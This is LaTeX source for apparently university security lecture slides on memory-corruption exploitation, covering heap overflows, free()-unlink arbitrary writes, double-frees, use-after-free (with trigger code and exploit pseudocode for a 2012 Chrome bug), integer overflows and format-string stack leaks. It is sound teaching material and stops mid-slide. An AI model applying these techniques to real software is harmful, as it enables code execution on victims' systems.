% FIXME: pointer to StackGuard paper

\begin{frame}
    \titlepage
\end{frame}

{
\setbeamercolor{background canvas}{bg=blue!40!black,fg=blue!10!white}
\setbeamercolor{normal text}{bg=blue!40!black,fg=blue!10!white}
\setbeamercolor{itemize/enumerate body}{fg=white}
\setbeamercolor{itemize/enumerate subbody}{fg=white}
\setbeamercolor{titlelike}{bg=blue!40!black,fg=blue!10!white}
\begin{frame}<1|handout:1>[noframenumbering]{Changelog}
    \begin{itemize}
        \item Corrections made in this version not in first posting:
        \begin{itemize}
        \item 1 April 2017: slide 41: a few more \%c's would be needed to skip format string part
        \end{itemize}
    \end{itemize}
\end{frame}
}

\tikzset{
    stackBox/.style={very thick},
    onStack/.style={thick},
    frameOne/.style={fill=blue!15},
    frameTwo/.style={fill=red!15},
    markLine/.style={blue!50!black},
    markLineB/.style={red!90!black},
    hiLine/.style={red!90!black},
}

\begin{frame}<0>[label=inheritMemLay]{C++ inheritence: memory layout}
\begin{tikzpicture}
    \tikzset{
        vt/.style={fill=blue!30},
    }
    \matrix[tight matrix,nodes={text width=3.8cm,text depth=.1ex,font=\small\tt},
            label={north:InputStream},anchor=north west] (inputStream)  at (0, 0) {
        |[vt]| vtable pointer \\
    };
    \matrix[tight matrix,nodes={text width=3.8cm,text depth=.1ex,font=\small\tt},
            label={north:SeekableInputStream},anchor=north west] (seekableStream) at (4.5, 0) {
        |[vt]| vtable pointer \\
    };
    \matrix[tight matrix,nodes={text width=6cm,text depth=.1ex,font=\small\tt},
            label={north:FileInputStream},anchor=north west] (fileStream) at (9, 0) {
        |[vt]| vtable pointer \\
        file\_pointer \\
    };
    \matrix[tight matrix,nodes={text width=3.8cm,text depth=.1ex,font=\small\tt},anchor=north west] (isVT) at (0, -2) {
        \tt slot for get\\
    };
    \matrix[tight matrix,nodes={text width=3.8cm,text depth=.1ex,font=\small\tt},anchor=north west] (seekVT) at (4.5, -2){
        \tt slot for get \\
        \tt slot for seek \\
        \tt slot for tell \\
    };
    \matrix[tight matrix,nodes={text width=6cm,text depth=.1ex,font=\small\tt},anchor=north west] (fileVT) at (9, -2){
        FileInputStream::get \\
        FileinputStream::seek \\
        FileInputStream::tell \\
    };
    \draw[thick,-Latex] (inputStream-1-1.east) -- ++(.35cm,0cm) |- (isVT-1-1.east);
    \draw[thick,-Latex] (seekableStream-1-1.east) -- ++(.35cm,0cm) |- (seekVT-1-1.east);
    \draw[thick,-Latex] (fileStream-1-1.east) -- ++(.35cm,0cm) |- (fileVT-1-1.east);
\end{tikzpicture}
\end{frame}

\begin{frame}{last time: pointer subterfuge}
    \begin{itemize}
    \item ``pointer subterfuge''
    \vspace{.5cm}
    \item overwrite a pointer
    \item overwritten pointer used to overwrite/access somewhere else
    \item many ways this translates into exploit
    \end{itemize}
\end{frame}

\begin{frame}{last time: targets for pointers}
    \begin{itemize}
    \item many ``targets'' for attacker
        \begin{itemize}
            \item change important data directly
            \item change return addresses, then have return happen
            \item change function pointer, then have it called
        \end{itemize}
    \item typically: rely on code address being used soon
        \begin{itemize}
            \item same as stack smashing --- but not necessairily return address
        \end{itemize}
    \item which is used --- depends on context
        \begin{itemize}
            \item different situations will make different ones easier/possible
        \end{itemize}
    \end{itemize}
\end{frame}

\begin{frame}{last time: frame pointer overwrite}
    \begin{itemize}
        \item way off-by-one errors were a problem
        \item many idea: frame pointer often next to buffer
        \item frame pointer used to locate return address
        \item changing frame pointer effectively changes return address
    \end{itemize}
\end{frame}

\begin{frame}<1>[label=errorTypes]{beyond normal buffer overflows}
    \begin{itemize}
    \item pretty much every memory error is a problem
    \item will look at exploiting:
    \item \myemph<2>{off-by-one buffer overflows (!)}
    \item \myemph<3>{heap buffer overflows}
    \item \myemph<5>{double-frees}
    \item \myemph<4>{use-after-free}
    \item \myemph<6>{integer overflows in size calculations}
    \end{itemize}
\end{frame}

\againframe<3>{errorTypes}

\begin{frame}[fragile,label=heapOverflowInObj]{easy heap overflows}
\begin{tikzpicture}
\node[anchor=north east] (code) at (-1,0) {
\begin{lstlisting}
struct foo {
    char buffer[100];
    void (*func_ptr)(void);
};
\end{lstlisting}
};
\draw[stackBox] (0, 0) rectangle (4, -6);
\draw[thick,-Latex] (-.25,-5) -- (-.25, -1) node [midway, above, sloped] {increasing addresses};
\draw[onStack] (0, -0.5) rectangle (4, -6) node[midway,font=\small] {\texttt{buffer}};
\draw[onStack] (0, -0) rectangle (4, -0.5) node[midway,font=\small] {\texttt{func\_ptr}};
\end{tikzpicture}
\end{frame}

\begin{frame}[fragile,label=heapOverflowAdj]{heap overflow: adjacent allocations}
\begin{tikzpicture}
\lstset{language=C++,style=small}
\node[anchor=north east] (code) at (-1,0) {
\begin{lstlisting}
class V {
  char buffer[100];
public:
  virtual void ...;
  ...
};
...
V *first = new V(...);
V *second = new V(...);
strcpy(first->buffer,
       attacker_controlled);
\end{lstlisting}
};
\node[anchor=south] at (2, 0) {the heap};
\draw[thick,-Latex] (-.25,-5) -- (-.25, -1) node [midway, above, sloped] {increasing addresses};
\draw[stackBox,fill=black!20] (0, 0) rectangle (4, -6);
\draw[onStack,fill=white] (0, -0.5) rectangle (4, -2.0) node[midway,font=\small] {\texttt{second}'s \texttt{buffer}};
\draw[onStack,fill=white] (0, -2.0) rectangle (4, -2.5) node[midway,font=\small] {\texttt{second}'s \textbf{vtable}};

\draw[onStack,fill=white] (0, -3.0) rectangle (4, -4.5) node[midway,font=\small] {\texttt{first}'s \texttt{buffer}};
\draw[onStack,fill=white] (0, -4.5) rectangle (4, -5.0) node[midway,font=\small] {\texttt{first}'s \textbf{vtable}};

\begin{visibleenv}<2>
    \fill[pattern=north west lines,pattern color=red!80] (0, -2.0) rectangle (4, -4.5);
    \node[anchor=west,font=\small,align=left] at (4.1, -3.25) {result of\\overflowing\\buffer};
\end{visibleenv}
\end{tikzpicture}
\end{frame}

\begin{frame}{heap smashing}
    \begin{itemize}
    \item ``lucky'' adjancent objects
    \item same things possible on stack
    \item but stack overflows had nice generic ``stack smashing''
    \item is there an equivalent for the heap?
    \item yes (mostly)
    \end{itemize}
\end{frame}

\begin{frame}{diversion: implementing malloc/new}
    \begin{itemize}
    \item many ways to implement malloc/new
    \item we will talk about one common technique
    \end{itemize}
\end{frame}

\begin{frame}[fragile,label=heapLayout]{heap object}
\begin{tikzpicture}
\node[anchor=north east] (code) at (-1,0) {
\begin{lstlisting}
struct AllocInfo {
  bool free;
  int size;
  AllocInfo *prev;
  AllocInfo *next;
};
\end{lstlisting}
};

\tikzset{xscale=0.9}
\begin{scope}[overlay]
    \draw[stackBox,fill=black!20] (0, 1) rectangle (3, -7);

    \draw[onStack] (0, 1) rectangle (3, 0) node[midway,font=\small,align=center] {free space \\ (deleted obj.)};
    \draw[onStack,fill=white] (0, -0.0) rectangle (3, -0.5) node[midway,font=\small] (freeANext) {next};
    \draw[onStack,fill=white] (0, -0.5) rectangle (3, -1.0) node[midway,font=\small] (freeAPrev) {prev};
    \draw[onStack,fill=white] (0, -1.0) rectangle (3, -1.5) node[midway,font=\small] (freeASize) {size/free};

    \draw[very thick, red, rounded corners] (0, 1) rectangle (3, -1.5);

    \draw[onStack,fill=blue!20] (0, -1.5) rectangle (3, -3.0) node[midway,font=\small,align=center] (freeBAlloc) {new'd object};
    \draw[onStack,fill=white] (0, -3.0) rectangle (3, -3.5) node[midway,font=\small] (freeBSize) {size/free};
    
    \draw[very thick, red, rounded corners] (0, -1.5) rectangle (3, -3.5);

    \draw[onStack] (0, -3.5) rectangle (3, -5.0) node[midway,font=\small] {free space};
    \draw[onStack,fill=white] (0, -5.0) rectangle (3, -5.5) node[midway,font=\small] (freeCNext) {next};
    \draw[onStack,fill=white] (0, -5.5) rectangle (3, -6.0) node[midway,font=\small] (freeCPrev) {prev};
    \draw[onStack,fill=white] (0, -6.0) rectangle (3, -6.5) node[midway,font=\small] (freeCSize) {size/free};
    
    \draw[very thick, red, rounded corners] (0, -3.5) rectangle (3, -6.5);
    
    \draw[-Latex,blue,thick] (freeAPrev) -- ++(1.75cm,0cm) |- (freeCSize);
    \draw[-Latex,blue,thick] (freeCNext) -- ++(2.00cm,0cm) |- (freeASize);
    \draw[-Latex,blue,thick,opacity=0.5] (freeCPrev) -- ++(1.25cm,0cm) -- ++(0cm,-2cm);
    \draw[-Latex,blue,thick,opacity=0.5] (freeANext) -- ++(1.75cm,0cm) -- ++(0cm,2cm);
\end{scope}
\draw[-Latex,line width=3pt,black!50] (3.5,-2.25) -- (5.5,-2.25) node[black,midway,above,font=\small\tt] {free};
\begin{scope}[overlay,xshift=6cm,name prefix=sec-]
    \draw[stackBox,fill=black!20] (0, 1) rectangle (3, -7);

    \draw[onStack] (0, 1) rectangle (3, -5.0) node[midway,font=\small] {free space};
    \draw[onStack,fill=white] (0, -5.0) rectangle (3, -5.5) node[midway,font=\small] (freeCNext) {next};
    \draw[onStack,fill=white] (0, -5.5) rectangle (3, -6.0) node[midway,font=\small] (freeCPrev) {prev};
    \draw[onStack,fill=white] (0, -6.0) rectangle (3, -6.5) node[midway,font=\small] (freeCSize) {size/free};
    
    \draw[-Latex,blue,thick,opacity=0.5] (freeCPrev) -- ++(1.25cm,0cm) -- ++(0cm,-2cm);
    \draw[-Latex,blue,thick,opacity=0.5] (freeCNext) -- ++(1.75cm,0cm) -- ++(0cm,2cm);
\end{scope}
\end{tikzpicture}
\end{frame}

\begin{frame}[fragile,label=freeImpl]{implementing free()}
\lstset{
    style=small,
    language=C,
    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
}
\begin{lstlisting}
int free(void *object) {
    ...
    block_after = object + object_size;
    if (block_after->free) {
        /* unlink from list */
        new_block->size += block_after->size;
        ~2~block_after->prev->next = block_after->next;~end~
        block_after->next->prev = block_after->prev;
    }
    ...
}
\end{lstlisting}
\begin{itemize}
\item<2> \large \myemph<2>{arbitrary memory write}
\end{itemize}
\end{frame}

\begin{frame}[fragile,label=vulnHeapSmash]{vulnerable code}
\lstset{
    style=small,
    language=C,
    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
}
\begin{tikzpicture}
\node[anchor=north east] (code) at (-1,0) {
\begin{lstlisting}
char *buffer = malloc(100);
... 
~2~strcpy(buffer, attacker_supplied);~end~
... 
free(buffer);
free(other_thing);
...
\end{lstlisting}
};

\tikzset{xscale=0.9}
\begin{scope}[overlay]
    \draw[stackBox,fill=black!20] (0, 1) rectangle (3, -7);

    \begin{pgfonlayer}{fg}
    \draw[very thick, orange, rounded corners] (0, 1) rectangle (3, -1.5);
    \draw[very thick, orange, rounded corners] (0, -1.5) rectangle (3, -3.5);
    \draw[very thick, orange, rounded corners] (0, -3.5) rectangle (3, -6.5);
    \end{pgfonlayer}

    \draw[onStack] (0, 1) rectangle (3, 0) node[midway,font=\small] {free space};
    \draw[onStack,fill=white] (0, -0.0) rectangle (3, -0.5) node[midway,font=\small] (freeANext) {next};
    \draw[onStack,fill=white] (0, -0.5) rectangle (3, -1.0) node[midway,font=\small] (freeAPrev) {prev};
    \draw[onStack,fill=white] (0, -1.0) rectangle (3, -1.5) node[midway,font=\small] (freeASize) {size/free};

    \draw[onStack,fill=blue!20] (0, -1.7) rectangle (3, -3.0) node[midway,font=\small,align=center] (freeBAlloc) {alloc'd object};
    \fill[pattern color=red,pattern=north west lines] (0, -0.0) rectangle (3, -3.0);
    \draw[onStack,fill=white] (0, -3.0) rectangle (3, -3.5) node[midway,font=\small] (freeBSize) {size/free};

    \draw[onStack] (0, -3.5) rectangle (3, -5.0) node[midway,font=\small] {free space};
    \draw[onStack,fill=white] (0, -5.0) rectangle (3, -5.5) node[midway,font=\small] (freeCNext) {next};
    \draw[onStack,fill=white] (0, -5.5) rectangle (3, -6.0) node[midway,font=\small] (freeCPrev) {prev};
    \draw[onStack,fill=white] (0, -6.0) rectangle (3, -6.5) node[midway,font=\small] (freeCSize) {size/free};
    
    \draw[-Latex,blue,thick] (freeAPrev) -- ++(1.75cm,0cm) -- ++ (0cm, -1cm) -- ++ (4cm,0cm); %|- (freeCSize);
    \draw[-Latex,blue,thick] (freeCNext) -- ++(2.00cm,0cm) -- ++ (0cm, 1cm) -- ++ (4cm,0cm); % |- (freeASize);
    \draw[-Latex,blue,thick,opacity=0.5] (freeCPrev) -- ++(1.25cm,0cm) -- ++(0cm,-2cm);
    \draw[-Latex,blue,thick,opacity=0.5] (freeANext) -- ++(1.75cm,0cm) -- ++(0cm,2cm);

    \begin{visibleenv}<2->
        \begin{scope}[xshift=-5cm,yshift=-3cm]
        \tikzset{gotBox/.style={thick,fill=orange!30}}
        \draw[gotBox] (0, -1) rectangle (4, -1.5) node[midway,font=\small] (freeEntry) {GOT entry: free};
        \draw[gotBox] (0, -1.5) rectangle (4, -2) node[midway,font=\small] {GOT entry: malloc };
        \draw[gotBox] (0, -2) rectangle (4, -2.5) node[midway,font=\small] (printfEntry) {GOT entry: printf };
        \draw[gotBox] (0, -2.5) rectangle (4, -3.0) node[midway,font=\small] {GOT entry: fopen };
        \end{scope}
        \draw[-Latex,red,ultra thick,dashed] (freeAPrev) -- ++(-2cm,0cm) |- ([yshift=-.25cm]printfEntry.east);
        \draw[-Latex,red,ultra thick,dashed] (freeANext) -- ++(-2.5cm,0cm) -- ++(0cm,-2.5cm) -- ++(-.5cm,0cm) node [black,solid,draw,left,align=left,fill=white] (scode) {shellcode};
    \end{visibleenv}
    \begin{visibleenv}<3->
        \begin{scope}[xshift=-5cm,yshift=-3cm]
        \draw[blue,opacity=0.8] (-2, -2) rectangle (0, -2.5) node[midway,font=\small] {size/free};
        \draw[blue,opacity=0.8] (-2, -1.5) rectangle (0, -2) node[midway,font=\small] {prev};
        \draw[blue,opacity=0.8] (-2, -1) rectangle (0, -1.5) node[midway,font=\small] {next};
        \end{scope}
        \draw[-Latex,blue,ultra thick,dotted] (freeEntry.north) -- ++(0cm,.1cm) -| (scode.south);
    \end{visibleenv}
\end{scope}
\end{tikzpicture}
\end{frame}

\againframe<5>{errorTypes}

\begin{frame}[fragile,label=dblFree]{double-frees}
\lstset{
    style=small,
    language=C,
    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
    moredelim={**[is][\btHL<3|handout:0>]{~3~}{~end~}},
    moredelim={**[is][\btHL<4|handout:0>]{~4~}{~end~}},
}
\begin{tikzpicture}
\node[anchor=north east] (code) at (-1,0) {
\begin{lstlisting}
~2~free(thing);~end~
~2~free(thing);~end~
char *~2~p = malloc(...);~end~
// p points to next/prev
//   on list of avail.
//   blocks
strcpy(p, attacker_controlled);
malloc(...);
char *q = malloc(...);
// q points to attacker-
//   chosen address
strcpy(q, attacker_controlled2);
...
\end{lstlisting}
};

\tikzset{xscale=0.9}
\begin{scope}[overlay]
    \draw[stackBox,fill=black!20] (0, 1) rectangle (3, -7);

    \draw[onStack] (0, 1) rectangle (3, 0) node[midway,font=\small] {free space};
    \draw[onStack,fill=white] (0, -0.0) rectangle (3, -0.5) node[midway,font=\small] (freeANext) {next};
    \draw[onStack,fill=white] (0, -0.5) rectangle (3, -1.0) node[midway,font=\small] (freeAPrev) {prev};
    \draw[onStack,fill=white] (0, -1.0) rectangle (3, -1.5) node[midway,font=\small] (freeASize) {size};

    \draw[onStack,fill=blue!20] (0, -1.7) rectangle (3, -3.0) node[midway,font=\small,align=center] (freeBAlloc) {alloc'd object};
    \draw[onStack,fill=white] (0, -3.0) rectangle (3, -3.5) node[midway,font=\small] (freeBSize) {size};

    \draw[onStack,fill=yellow!20] (0, -3.5) rectangle (3, -6.0) node[midway,font=\small,align=center,yshift=.5cm] {alloc'd object\\
                \tt thing\only<2->{/p}};
    \begin{visibleenv}<2->
    \draw[onStack,fill=yellow!10,dashed] (0, -5.5) rectangle (3, -6.0) node[midway,font=\small] (freeCPrev) {prev};
    \draw[onStack,fill=yellow!10,dashed] (0, -5.0) rectangle (3, -5.5) node[midway,font=\small] (freeCNext) {next};
    \draw[-Latex,blue,thick,opacity=0.5] (freeCPrev) -- ++(1.75cm,0cm) -- ++(0cm,-2cm);
    \draw[-Latex,blue,thick,opacity=0.5] (freeCNext) -- ++(2.25cm,0cm) -- ++(0cm,2cm);
    \end{visibleenv}
    \draw[onStack,fill=white] (0, -6.0) rectangle (3, -6.5) node[midway,font=\small] (freeCSize) {size};
    
    \draw[-Latex,blue,thick,opacity=0.5] (freeAPrev) -- ++(1.75cm,0cm) -- ++(0cm,-2cm);
    \draw[-Latex,blue,thick,opacity=0.5] (freeANext) -- ++(2.25cm,0cm) -- ++(0cm,2cm);
\end{scope}
    \begin{visibleenv}<3>
        \node[draw=red, ultra thick, anchor=east,align=left,fill=white] at (-.5, -4) {
            malloc returns something \myemph{still on free list} \\
            because double-free made \myemph{loop} in linked list
        };
    \end{visibleenv}
\end{tikzpicture}
\end{frame}


% FIXME: as pictures
\begin{frame}[fragile,label=dblFreeExpand]{double-free expansion}
\lstset{
    style=smaller,
    language=C,
    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
    moredelim={**[is][\btHL<3|handout:0>]{~3~}{~end~}},
    moredelim={**[is][\btHL<4|handout:0>]{~4~}{~end~}},
    moredelim={**[is][\btHL<5|handout:0>]{~5~}{~end~}},
    moredelim={**[is][\btHL<6|handout:0>]{~6~}{~end~}},
}
\begin{tikzpicture}
\node[anchor=north east] (code) at (-1,0) {
\begin{lstlisting}
// free/delete 1:
~2~double_freed->next = first_free;~end~
~2~first_free = chunk;~end~
// free/delete 2:
~3~double_freed->next = first_free;~end~
~3~first_free = chunk~end~
// malloc/new 1:
~4~result1 = first_free;~end~
~4~first_free = first_free->next;~end~
// + overwrite:
~4~strcpy(result1, ...);~end~
// malloc/new 2:
~5~first_free = first_free->next;~end~
// malloc/new 3: 
result3 = first_free;
strcpy(result3, ...);
\end{lstlisting}
};
\draw[stackBox] (0,0) rectangle (5, -2);
\draw[onStack,fill=blue!20] (0,0) rectangle (5, -1) node[midway,font=\small] {next / double free'd object};
\draw[onStack] (0,-1) rectangle (5, -2) node[midway,font=\small] {size};
\draw[stackBox] (0, -4) rectangle (5, -5) node[midway,font=\small,align=center] {first\_free \\ (global)};
\draw[stackBox,dashed] (0.5, -2.5) rectangle (5.5, -3.5) node[midway,font=\small,align=center] {(original first free)};

\begin{visibleenv}<1>
\draw[-Latex,blue,thick] (0, -4.5) -- ++(-0.5cm,0cm) |- (0.5, -3);
\end{visibleenv}
\begin{visibleenv}<2-4>
\draw[-Latex,blue,thick] (0, -4.5) -- ++(-0.5cm,0cm) |- (0, -1.5);
\end{visibleenv}
\begin{visibleenv}<2>
\draw[-Latex,blue,thick] (5, -0.5) -- ++(1.5cm,0cm) |- (5.5, -3);
\end{visibleenv}

\begin{visibleenv}<3->
\draw[-Latex,blue,thick] (5, -0.5) -- ++(0.5cm,0cm) |- (5, -1.5);
\end{visibleenv}

\begin{visibleenv}<4->
\fill[pattern=north west lines,pattern color=red] (0, 0) rectangle (5, -1);
\draw[red,dashed,ultra thick,-Latex] (5,-0.5) -- ++(1cm, 0cm) |- (3, -5.5);
\draw[stackBox,fill=orange!30] (0, -5.25) rectangle (3, -6.25) node[midway,font=\small] {GOT entry: free};
\end{visibleenv}
\begin{visibleenv}<4->
\node[overlay,text=black,draw=red!80,thick,font=\small\tt,anchor=south] at (3, 0) { first/second malloc };
\end{visibleenv}

\begin{visibleenv}<5->
\draw[-Latex,blue,thick] (0, -4.5) -- ++(-1cm, 0cm) |- (0, -5.75);
\node[text=black,draw=red!80,thick,font=\small\tt,anchor=north west] at (3, -6) { third malloc };
\end{visibleenv}
\end{tikzpicture}
\end{frame}

\begin{frame}{double-free notes}
    \begin{itemize}
    \item this attack has apparently not been possible for a while
    \item most malloc/new's \myemph{check for double-frees} explicitly
        \begin{itemize}
        \item (e.g., look for a bit in {\tt size} data)
        \end{itemize}
    \item prevents this issue --- also catches programmer errors
    \item pretty cheap
    \end{itemize}
\end{frame}

% FIXME more stuff

\againframe<4>{errorTypes}

\begin{frame}[fragile,label=vulnUAF]{vulnerable code}
\lstset{
    language=C++,
    style=smaller,
    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
}
\begin{tikzpicture}
\node[anchor=north east] (code) at (-1,0) {
\begin{lstlisting}
class Foo {
    ...
};
Foo *the_foo;
the_foo = new Foo;
...
delete the_foo;
...
something_else = new Bar(...);
the_foo->something();
\end{lstlisting}
};
\node[draw,anchor=north west,align=left] at (-3,0) {
    {\tt something\_else} likely where {\tt the\_foo} was
};
\begin{visibleenv}<2>
\draw[stackBox] (0, -2) rectangle (3, -5);
\draw[stackBox] (4, -2) rectangle (7, -5);
\draw[onStack,fill=blue!20] (0, -2) rectangle (3, -3) node[midway,align=center,font=\small] { vtable ptr (Foo) };
\draw[onStack,fill=blue!20] (0, -3) rectangle (3, -5) node[midway,align=center,font=\small] {data for Foo };
\draw[onStack,fill=yellow!20] (4, -2) rectangle (7, -3) node[midway,align=center,font=\small] { vtable ptr (Bar)? \\
                                                                                   other data? };
\draw[onStack,fill=yellow!20] (4, -3) rectangle (7, -5) node[midway,align=center,font=\small] { data for Bar  };
\end{visibleenv}
\end{tikzpicture}
\end{frame}

\againframe<2>{inheritMemLay}

\begin{frame}{exploiting use after-free}
\begin{itemize}
\item trigger many ``bogus'' frees; then
\item allocate many things of same size with ``right'' pattern  
    \begin{itemize}
    \item pointers to shellcode?
    \item pointers to pointers to {\tt system()}?
    \item objects with something useful in VTable entry?
    \end{itemize}
\item trigger use-after-free thing
\end{itemize}
\end{frame}

\begin{frame}{real UAF exploitable bug}
    \begin{itemize}
        \item 2012 bug in Google Chrome
        \item exploitable via JavaScript
        \item discovered/proof of concept by PinkiePie
        \item allowed arbitrary code execution via VTable manipulation
        \item \ldots despite exploit mitigations (we'll revisit this later)
    \end{itemize}
\end{frame}


\begin{frame}[fragile,label=UAFTriggering]{UAF triggering code}
\lstset{
    language=JavaScript,
    style=smaller,
    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
    moredelim={**[is][\btHL<3-4|handout:0>]{~3~}{~end~}},
    moredelim={**[is][\btHL<4|handout:0>]{~4~}{~end~}},
}
\begin{tikzpicture}
\node[anchor=north east] (code) at (0, 0) {
\begin{lstlisting}
// in HTML near this JavaScript:
// <video id="vid"> (video player element)
function source_opened() {
  buffer = ms.addSourceBuffer('video/webm; codecs="vorbis,vp8"');
  ~2~vid.parentNode.removeChild(vid);~end~
  gc(); // force garbage collector to run now
  // garbage collector frees unreachable objects
  // (would be run automatically, eventually, too)
  // buffer now internally refers to delete'd player object
  ~3~buffer.timestampOffset = 42;~end~
}
ms = new WebKitMediaSource();
ms.addEventListener('webkitsourceopen', source_opened);
vid.src = window.URL.createObjectURL(ms);
\end{lstlisting}
};
    \begin{visibleenv}<4->
        \node[fill=white,opacity=0.6,fit=(code)] {};
        \node[draw=red,ultra thick,anchor=north east,fill=white,overlay] (cppCode) at (-.25, .125) { 
\lstset{
    language=C++,
    style=smaller,
    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
    moredelim={**[is][\btHL<3-4|handout:0>]{~3~}{~end~}},
    moredelim={**[is][\btHL<4|handout:0>]{~4~}{~end~}},
    moredelim={**[is][\btHL<5|handout:0>]{~5~}{~end~}},
}
\begin{lstlisting}
// implements JavaScript buffer.timestampOffset = 42
void SourceBuffer::setTimestampOffset(...) {
     if (m_source->setTimestampOffset(...))
        ...
}
bool MediaSource::setTimestampOffset(...) {
    // m_player was deleted when video player element deleted
    // but this call does *not* use a VTable
    if (!~4~m_player~end~->sourceSetTimestampOffset(id, offset)) 
        ...
}
bool MediaPlayer::sourceSetTimestampOffset(...) {
    // m_private deleted when MediaPlayer deleted
    // this *is* a VTable-based call
    return ~5~m_private~end~->sourceSetTimestampOffset(id, offset);
}
\end{lstlisting}
    };
    \end{visibleenv}
\end{tikzpicture}
\imagecredit{via \url{https://bugs.chromium.org/p/chromium/issues/detail?id=162835}}
\end{frame}

\begin{frame}[fragile,label=theExploit]{UAF exploit (pseudocode)}
\begin{lstlisting}[language=JavaScript,style=smaller]
... /* use information leaks to find relevant addresses */ 
buffer = ms.addSourceBuffer('video/webm; codecs="vorbis,vp8"');
vid.parentNode.removeChild(vid);
vid = null;
gc();
// allocate object to replace m_private
var array = new Uint32Array(168/4);
// allocate object to replace m_player
// type chosen to keep m_private pointer unchanged
rtc = new webkitRTCPeerConnection({'iceServers': []});
 ... /* fill ia with chosen addresses */
// trigger VTable Call that uses chosen address
buffer.timestampOffset = 42;
\end{lstlisting}
\end{frame}

\begin{frame}{missing pieces: information disclosure}
    \begin{itemize}
        \item need to learn address to set VTable pointer to
        \item (and other addresses to use)
        \item allocate types other than \texttt{Uint32Array}
        \item rely on confusing between different types, e.g.:
    \end{itemize}
    \begin{tikzpicture}
    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
            label={north:{\tt MediaPlayer} (deleted but used)}] (PlayerVT) at (0, 0) {
        m\_private {\normalfont (pointer to PlayerImpl)} \\
        m\_timestampOffset {\normalfont (double)} \\
    };
    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
            label={north:{\tt Something} (replacement)}] (SomethingVT) at (8, 0) {
        \ldots \\
        m\_buffer {\normalfont (pointer)} \\
    };
    \end{tikzpicture}
\end{frame}

\begin{frame}{use-after-free easy cases}
\begin{itemize}
    \item common problem for JavaScript implementations
    \item use-after-free'd object often some complex C++ object
        \begin{itemize}
            \item example: representation of video stream
        \end{itemize}
    \item exploits can \myemph{choose type of object that replaces}
        \begin{itemize}
            \item allocate that kind of object in JS
        \end{itemize}
    \item can often arrange to read/write vtable pointer
        \begin{itemize}
            \item depends on layout of thing created
            \item easy examples: string, array of floating point numbers
        \end{itemize}
\end{itemize}
\end{frame}

\againframe<6>{errorTypes}

\begin{frame}[fragile,label=intOverflowEx]{integer overflow example}
\lstset{
    language=C,
    morekeywords=item,
    style=smaller,
    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
}
\begin{tikzpicture}
\node[anchor=north east] (code) at (-1,0) {
\begin{lstlisting}
item *load_items(int len) {
  int total_size = ~2~len * sizeof(item);~end~
  if (total_size >= LIMIT) {
    return NULL;
  }
  item *items = malloc(total_size);
  for (int i = 0; i < len; ++i) {
    int failed = read_item(&items[i]);
    if (failed) {
      free(items);
      return NULL;
    }
  }
  return items;
}
\end{lstlisting}
};
\node[align=left,anchor=north west,font=\small] (t1) at (0,0) {
    {\tt len} = {\tt 0x4000 0001} \\
    {\tt sizeof(item)} = {\tt 0x10}
};
\node[align=left,anchor=north west,font=\small] (t2) at (t1.south west) {
    {\tt total\_size} = \\
    {\tt 0x\textcolor{red}{4} 0000 0010} \\
};
\end{tikzpicture}
\end{frame}

\begin{frame}[fragile,label=intUOEx]{integer under/overflow: real example}
    \begin{itemize}
        \item part of another Google Chrome exploit by Pinkie Pie:
    \end{itemize}
    \begin{lstlisting}[language=C,style=small,morekeywords={uint32,size_t}]
// In graphics command processing code:
uint32 ComputeMaxResults(size_t size_of_buffer) {
    return (size_of_buffer - sizeof(uint32)) / sizeof(T);
} 
size_t ComputeSize(size_t num_results) {
    return sizeof(T) * num_results + sizeof(uint32);
} 
// exploit: size_of_buffer < sizeof(uint32)
\end{lstlisting}
    \begin{itemize}
        \item result: write 8 bytes after buffer 
            \begin{itemize}
                \item sometimes overwrites data pointer
            \end{itemize}
    \end{itemize}
\imagecredit{via \url{https://blog.chromium.org/2012/05/tale-of-two-pwnies-part-1.html}}
\end{frame}

\begin{frame}{special exploits}
    \begin{itemize}
        \item format string exploits
        \item topic of next homework
    \end{itemize}
\end{frame}

\begin{frame}[fragile,label=formatStringIntro]{format string exploits}
\lstset{language=C}
\begin{lstlisting}
printf("The command you entered ");
printf(command);
printf("was not recognized.\n");
\end{lstlisting}
    \begin{itemize}
        \item<2> what if \texttt{command} is {\tt \%s}?
    \end{itemize}
\end{frame}

% FIXME: demo based on this looking at registers in GDB

\begin{frame}[fragile,label=viewingTheStack]{viewing the stack}
\lstset{
    language={},
    style=smaller,
    moredelim={**[is][\color{blue!70!black}]{~in~}{~end~}},
    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
    moredelim={**[is][\btHL<3|handout:0>]{~3~}{~end~}},
    moredelim={**[is][\btHL<4|handout:0>]{~4~}{~end~}},
    moredelim={**[is][\btHL<5|handout:0>]{~5~}{~end~}},
}
\vspace{-.25cm}
\begin{lstlisting}
$ ~in~cat test-format.c~end~
#include <stdio.h>

int main(void) {
    char buffer[100];
    while(fgets(buffer, sizeof buffer, stdin)) {
        printf(buffer);
    }
}
$ ~in~./test-format.exe~end~
~in~%016lx %016lx %016lx %016lx %016lx %016lx %016lx %016lx~end~
~3~00007fb54d0c6790~end~ ~4~786c363130252078~end~ ~4~0000000000ac6048~end~ ~4~3631302520786c36~end~
~4~3631302500000000~end~ ~5~6c3631302520786c~end~ 786c363130252078 ~2~20786c36313025~end~20
\end{lstlisting}
\begin{tikzpicture}[overlay,remember picture]
    \tikzset{every node/.style={draw,thick,fill=white}}
    \begin{visibleenv}<2>
        \node at (current page.center) {
            {\tt 25 30 31 36 6c 78 20} is ASCII for {\tt \%016lx\textvisiblespace}
        };
    \end{visibleenv}
    \begin{visibleenv}<3>
        \node at (current page.center) {
            second argument to {\tt printf}: \%rsi
        };
    \end{visibleenv}
    \begin{visibleenv}<4>
        \node at (current page.center) {
            third through fifth argument to {\tt printf}: \%rdx, \%rcx, \%r8, \%r9
        };
    \end{visibleenv}
    \begin{visibleenv}<4>
        \node at (current page.center) {
            third through fifth argument to {\tt printf}: \%rdx, \%rcx, \%r8, \%r9
        };
    \end{visibleenv}
    \begin{visibleenv}<5>
